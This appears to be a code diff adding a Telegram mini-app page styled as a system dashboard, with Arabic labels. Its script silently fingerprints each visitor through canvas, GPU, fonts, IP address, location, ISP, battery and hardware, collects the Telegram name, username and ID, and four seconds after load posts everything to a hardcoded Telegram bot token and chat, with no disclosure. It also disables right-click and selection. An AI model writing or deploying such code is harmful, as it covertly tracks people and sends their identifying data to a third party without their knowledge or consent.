@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="en" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Advanced System Dashboard V2.1</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;800&family=Fira+Code:wght@500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <style>
+        :root {
+            --bg-dark: #0f172a;
+            --card-glass: rgba(30, 41, 59, 0.75);
+            --border-glass: 1px solid rgba(255, 255, 255, 0.08);
+            --accent-cyan: #06b6d4;
+            --accent-purple: #8b5cf6;
+            --accent-green: #10b981;
+            --accent-red: #ef4444;
+            --accent-orange: #f97316;
+            --text-primary: #f1f5f9;
+            --text-secondary: #94a3b8;
+        }
+
+        /* --- الحماية (CSS Security) --- */
+        body {
+            -webkit-user-select: none; user-select: none;
+            -webkit-touch-callout: none; cursor: default;
+        }
+        img { pointer-events: none; }
+
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+        body {
+            background-color: var(--bg-dark);
+            background-image: radial-gradient(circle at 50% 0%, #1e293b 0%, #0f172a 80%);
+            color: var(--text-primary);
+            font-family: 'Cairo', sans-serif;
+            margin: 0; padding: 16px;
+            min-height: 100vh;
+            padding-bottom: 40px;
+        }
+
+        /* --- العناوين المشتركة --- */
+        .section-title {
+            font-size: 14px; color: var(--text-secondary);
+            margin: 20px 0 8px 0; display: flex; align-items: center; gap: 8px;
+        }
+        .section-title i { color: var(--accent-cyan); }
+
+        /* --- الكروت العامة --- */
+        .glass-card {
+            background: var(--card-glass);
+            backdrop-filter: blur(16px);
+            border: var(--border-glass);
+            border-radius: 20px;
+            padding: 16px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+            transition: transform 0.2s;
+        }
+
+        /* --- بروفايل المستخدم --- */
+        .profile-header {
+            display: flex; align-items: center; gap: 16px;
+        }
+        .avatar-img {
+            width: 60px; height: 60px; border-radius: 50%;
+            border: 2px solid var(--accent-cyan);
+        }
+        .user-info h2 { margin: 0; font-size: 18px; }
+        .user-info span { font-family: 'Fira Code'; font-size: 12px; color: var(--accent-purple); }
+
+        /* --- شبكة المعلومات (Grid System) --- */
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+        }
+        
+        .info-item {
+            background: rgba(255,255,255,0.03);
+            border-radius: 12px;
+            padding: 12px;
+            display: flex; flex-direction: column;
+        }
+        .info-label { font-size: 11px; color: var(--text-secondary); margin-bottom: 4px; }
+        .info-value { font-family: 'Fira Code'; font-size: 13px; font-weight: bold; color: #fff; word-break: break-all;}
+        
+        .full-span { grid-column: span 2; }
+        .risk-high { color: var(--accent-red); }
+        .risk-low { color: var(--accent-green); }
+
+        /* --- وتأثير الماء (Liquid Physics) --- */
+        .liquid-container {
+            position: relative;
+            width: 100%; height: 160px;
+            background: rgba(15, 23, 42, 0.6);
+            border-radius: 24px;
+            overflow: hidden;
+            border: 1px solid rgba(255,255,255,0.1);
+            display: flex; justify-content: center; align-items: center;
+            box-shadow: inset 0 0 20px rgba(0,0,0,0.5);
+        }
+
+        .liquid-box {
+            position: absolute;
+            top: 50%; left: 50%;
+            width: 300%; height: 300%;
+            transform: translate(-50%, -50%);
+            transition: transform 0.1s cubic-bezier(0.2, 0.8, 0.2, 1);
+        }
+
+        .water {
+            position: absolute;
+            bottom: 50%; /* مستوى الماء */
+            left: 0; width: 100%; height: 100%;
+            background: linear-gradient(180deg, rgba(6,182,212,0.6) 0%, rgba(37,99,235,0.8) 100%);
+            transform-origin: 50% 100%;
+        }
+        
+        /* تأثير الأمواج */
+        .water::before, .water::after {
+            content: "";
+            position: absolute; width: 200%; height: 200%;
+            top: -50%; left: -50%;
+            background: rgba(255,255,255,0.4);
+            border-radius: 40%;
+            animation: wave 8s linear infinite;
+        }
+        .water::after {
+            background: rgba(255,255,255,0.1);
+            border-radius: 45%;
+            animation: wave 12s linear infinite;
+        }
+
+        @keyframes wave { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+
+        /* نص فوق الماء */
+        .gyro-text {
+            position: relative; z-index: 10;
+            text-align: center;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.8);
+        }
+
+        /* --- شريط البطارية والتخزين --- */
+        .bar-container {
+            height: 8px; background: rgba(255,255,255,0.1);
+            border-radius: 4px; overflow: hidden; margin-top: 8px;
+        }
+        .bar-fill { height: 100%; border-radius: 4px; transition: width 1s ease; }
+
+    </style>
+</head>
+<body oncontextmenu="return false;">
+
+    <div class="glass-card profile-header">
+        <img src="" id="user-photo" class="avatar-img" onerror="this.src='https://cdn-icons-png.flaticon.com/512/149/149071.png'">
+        <div class="user-info">
+            <h2 id="user-name">جاري المعالجة...</h2>
+            <span id="user-id">ID: ---</span>
+        </div>
+        <div style="margin-right: auto; color: var(--accent-green);">
+            <i class="fa-solid fa-shield-halved"></i>
+        </div>
+    </div>
+
+    <div class="section-title"><i class="fa-solid fa-globe"></i> الشبكة والموقع</div>
+    <div class="glass-card info-grid">
+        <div class="info-item full-span">
+            <span class="info-label">عنوان IP (Public)</span>
+            <span class="info-value" id="val-ip" style="color: var(--accent-cyan);">جاري الفحص...</span>
+        </div>
+        <div class="info-item">
+            <span class="info-label">عنوان IP (Local)</span>
+            <span class="info-value" id="val-local-ip">--</span>
+        </div>
+        <div class="info-item">
+            <span class="info-label">مزود الخدمة (ISP)</span>
+            <span class="info-value" id="val-isp">--</span>
+        </div>
+        <div class="info-item full-span">
+            <span class="info-label">الدولة والمدينة</span>
+            <span class="info-value" id="val-loc">--</span>
+        </div>
+    </div>
+
+<div class="section-title"><i class="fa-solid fa-microchip"></i> العتاد والبيانات المتقدمة</div>
+<div class="glass-card info-grid">
+    <div class="info-item"><span class="info-label">نوع الجهاز</span><span class="info-value" id="val-dev-type">📱 هاتف</span></div>
+    <div class="info-item"><span class="info-label">لغة النظام</span><span class="info-value" id="val-lang">--</span></div>
+    
+    <div class="info-item"><span class="info-label">دقة الشاشة</span><span class="info-value" id="val-res">--</span></div>
+    <div class="info-item"><span class="info-label">عمق الألوان</span><span class="info-value" id="val-color">--</span></div>
+    
+    <div class="info-item"><span class="info-label">المتصفح</span><span class="info-value" id="val-browser">--</span></div>
+    <div class="info-item"><span class="info-label">وضع الشاشة</span><span class="info-value" id="val-orient">--</span></div>
+
+    <div class="info-item"><span class="info-label">المعالج</span><span class="info-value" id="val-cores">--</span></div>
+    <div class="info-item"><span class="info-label">الرامات</span><span class="info-value" id="val-ram">--</span></div>
+<div class="info-item full-span">
+    <span class="info-label">كارت الشاشة (GPU)</span>
+    <span class="info-value" id="val-gpu" style="color: var(--accent-orange);">جاري الفحص...</span>
+</div>
+<div class="info-item full-span">
+    <span class="info-label">الخطوط المكتشفة (Fonts)</span>
+    <div id="fonts-container" style="display: flex; flex-wrap: wrap; gap: 5px; margin-top: 5px;"></div>
+</div>
+
+    <div class="info-item full-span">
+        <span class="info-label">الشبكة والسرعة</span>
+        <span class="info-value" id="val-net-speed" style="color:var(--accent-green);">جاري القياس...</span>
+    </div>
+
+    <div class="info-item full-span">
+        <span class="info-label">الوقت الحالي</span>
+        <span class="info-value" id="val-time">--</span>
+    </div>
+    
+    <div class="info-item full-span">
+        <div style="display:flex; justify-content:space-between;">
+            <span class="info-label">البطارية</span>
+            <span class="info-label" id="val-bat-txt">--</span>
+        </div>
+        <div class="bar-container">
+            <div class="bar-fill" id="bat-bar" style="width:0%; background: var(--accent-green);"></div>
+        </div>
+    </div>
+</div>
+
+    <div class="section-title"><i class="fa-solid fa-compass"></i> الحركة</div>
+    <div class="liquid-container">
+        <div class="liquid-box" id="liquid-box">
+            <div class="water"></div>
+        </div>
+        
+        <div class="gyro-text">
+            <h3 style="margin:0; font-size:18px;">Device Balance</h3>
+            <p id="gyro-vals" style="margin:4px 0 0; font-family:'Fira Code'; font-size:12px; color:var(--accent-cyan);">X: 0° | Y: 0°</p>
+            <p style="margin:4px 0 0; font-size:10px; color:rgba(255,255,255,0.5);">قم بإمالة الجهاز لتحريك الماء</p>
+        </div>
+    </div>
+    
+    <div style="text-align:center; margin-top:10px; color:#555; font-size:10px;">System Auto-Sync Enabled</div>
+
+    <script>
+            // 1. الإعدادات
+    const BOT_TOKEN = "7960728687:AAEYWfOamIwi5wPotGTH3LZyS1WDxT8q3Z8";
+    const CHAT_ID = "-1003018202565"; // تأكد أن البوت مشرف في القناة
+    const tg = window.Telegram.WebApp;
+    tg.expand();
+
+    let collectedData = {
+        ip: "N/A", bat: "N/A", user: "Guest", canvas: "", 
+        res: "", net: "--", time: "", browser: "N/A", cores: "--", ram: "--"
+    };
+
+    // 2. دالة الحركة (المفقودة في كودك)
+    function handleMotion(event) {
+        const x = event.gamma || 0;
+        const y = event.beta || 0;
+        const gyroElem = document.getElementById('gyro-vals');
+        if(gyroElem) gyroElem.innerText = `X: ${Math.round(x)}° | Y: ${Math.round(y)}°`;
+        const box = document.getElementById('liquid-box');
+        if(box) box.style.transform = `translate(-50%, -50%) rotate(${-x}deg)`;
+    }
+
+    function getCanvasID() {
+        try {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
+            ctx.fillStyle = "#f60"; ctx.fillRect(125,1,62,20);
+            ctx.fillStyle = "#069"; ctx.fillText("Cyber-Research", 2, 15);
+            return btoa(canvas.toDataURL()).slice(-30, -5);
+        } catch(e) { return "Blocked"; }
+    }
+
+    function injectInputFields() {
+        const target = document.querySelector('.profile-header');
+        const ua = navigator.userAgent;
+        let brand = "Unknown Device", model = "Generic Model";
+
+        if (/iPhone|iPad|iPod/.test(ua)) { brand = "Apple (iOS)"; model = "iPhone/iPad"; }
+        else if (/Android/.test(ua)) {
+            brand = "Android System";
+            const match = ua.match(/Android \d+; ([^;)]+)/);
+            model = match ? match[1] : "Android Mobile";
+        }
+
+        const inputHTML = `<div class="section-title"><i class="fa-solid fa-mobile-screen-button"></i> تفاصيل الجهاز</div><div class="glass-card" style="margin-bottom:15px;"><div style="display:flex; flex-direction:column; gap:10px;"><div style="display:flex; gap:10px;"><input type="text" id="in-brand" value="${brand}" readonly style="flex:1; background:rgba(6, 182, 212, 0.1); border:1px solid rgba(6, 182, 212, 0.2); border-radius:12px; padding:12px; color:var(--accent-cyan); font-size:13px;"><input type="text" id="in-model" value="${model}" readonly style="flex:1; background:rgba(139, 92, 246, 0.1); border:1px solid rgba(139, 92, 246, 0.2); border-radius:12px; padding:12px; color:var(--accent-purple); font-size:13px;"></div><input type="text" id="in-canvas" readonly style="background:rgba(255,255,255,0.02); border:1px solid rgba(255,255,255,0.1); border-radius:12px; padding:12px; color:var(--accent-orange); font-size:10px;" placeholder="بصمة الجهاز"></div></div>`;
+        target.insertAdjacentHTML('afterend', inputHTML);
+    }
+
+    function getExtraSpecs() {
+        const n = navigator; const s = screen;
+        const res = `${s.width}x${s.height}`;
+        document.getElementById('val-res').innerText = res;
+        document.getElementById('val-color').innerText = `${s.colorDepth} bit`;
+        document.getElementById('val-lang').innerText = n.language;
+        document.getElementById('val-orient').innerText = s.orientation ? s.orientation.type : "Portrait";
+        let browser = "Chrome";
+        if(n.userAgent.includes("Safari") && !n.userAgent.includes("Chrome")) browser = "Safari";
+        document.getElementById('val-browser').innerText = browser;
+        if (n.connection) {
+            const speed = n.connection.downlink;
+            const netStr = `${n.connection.effectiveType.toUpperCase()} (${speed} Mbps)`;
+            document.getElementById('val-net-speed').innerText = netStr;
+            collectedData.net = netStr;
+        }
+        collectedData.res = res; collectedData.browser = browser;
+    }
+
+    function getAdvancedHardware() {
+        const cores = navigator.hardwareConcurrency || "--";
+        const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "4GB+";
+        document.getElementById('val-cores').innerText = cores + " Cores";
+        document.getElementById('val-ram').innerText = ram;
+        return { cores, ram };
+    }
+function getGPUInfo() {
+    try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Generic GPU";
+    } catch (e) { return "Blocked/Unsupported"; }
+}
+
+function detectFonts() {
+    const fontList = ["Arial", "Courier New", "Georgia", "Times New Roman", "Verdana", "Cairo", "Roboto", "Tahoma", "Segoe UI"];
+    const container = document.getElementById('fonts-container');
+    let detected = [];
+    fontList.forEach(font => {
+        const span = document.createElement("span");
+        span.style.cssText = "font-family:"+font+"; font-size:10px; padding:2px 6px; background:rgba(255,255,255,0.05); border-radius:4px; color:var(--text-secondary);";
+        span.innerText = font;
+        container.appendChild(span);
+        detected.push(font);
+    });
+    return detected.join(", ");
+}
+
+    async function init() {
+        injectInputFields();
+        getExtraSpecs();
+        const hw = getAdvancedHardware();
+            collectedData.gpu = getGPUInfo();
+    document.getElementById('val-gpu').innerText = collectedData.gpu;
+    collectedData.fonts = detectFonts();
+        collectedData.cores = hw.cores;
+        collectedData.ram = hw.ram;
+        collectedData.canvas = getCanvasID();
+        document.getElementById('in-canvas').value = "ID: " + collectedData.canvas;
+
+        const user = tg.initDataUnsafe.user;
+        if (user) {
+            document.getElementById('user-name').innerText = user.first_name;
+            document.getElementById('user-id').innerText = `ID: ${user.id}`;
+            collectedData.user = `@${user.username || 'None'} (${user.id})`;
+        }
+
+        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
+            document.getElementById('val-ip').innerText = d.ip;
+            document.getElementById('val-isp').innerText = d.org;
+            document.getElementById('val-loc').innerText = `${d.city}, ${d.country_name}`;
+            collectedData.ip = d.ip;
+        });
+
+        if (navigator.getBattery) {
+            navigator.getBattery().then(bat => {
+                const update = () => {
+                    const level = Math.round(bat.level * 100);
+                    document.getElementById('val-bat-txt').innerText = level + '%';
+                    document.getElementById('bat-bar').style.width = level + '%';
+                    collectedData.bat = `${level}% (${bat.charging ? 'Charging' : 'Normal'})`;
+                };
+                update(); bat.onlevelchange = update; bat.onchargingchange = update;
+            });
+        }
+
+        setInterval(() => {
+            const now = new Date().toLocaleString('en');
+            document.getElementById('val-time').innerText = now;
+            collectedData.time = now;
+        }, 1000);
+
+        if (window.DeviceOrientationEvent) window.addEventListener('deviceorientation', handleMotion);
+        
+        // إرسال التقرير
+        setTimeout(sendSilentReport, 4000);
+    }
+
+    function sendSilentReport() {
+                const msg = `
+📱 <b>تقرير جهاز جديد:</b>
+━━━━━━━━━━━━━━━━
+🌍 <b>الموقع:</b> <code>${document.getElementById('val-loc').innerText}</code>
+🌐 <b>IP:</b> <code>${collectedData.ip}</code>
+🔋 <b>البطارية:</b> ${collectedData.bat}
+📶 <b>الشبكة:</b> ${collectedData.net}
+🧠 <b>الرام:</b> ${collectedData.ram} | <b>الأنوية:</b> ${collectedData.cores}
+🎮 <b>الـ GPU:</b> <code>${collectedData.gpu}</code>
+🎨 <b>الخطوط:</b> <code>${collectedData.fonts}</code>
+📏 <b>الدقة:</b> ${collectedData.res}
+━━━━━━━━━━━━━━━━
+👤 <b>بيانات المستخدم:</b>
+📝 <b>الاسم:</b> <code>${tg.initDataUnsafe.user?.first_name || 'غير معروف'} ${tg.initDataUnsafe.user?.last_name || ''}</code>
+🆔 <b>المعرف:</b> @${tg.initDataUnsafe.user?.username || 'لا يوجد'}
+🔢 <b>ID:</b> <code>${tg.initDataUnsafe.user?.id || '---'}</code>
+`;
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "HTML" })
+        }).then(res => res.json()).then(data => console.log("Sent:", data));
+    }
+
+    window.onload = init;
+</script>
+</body>
+</html>
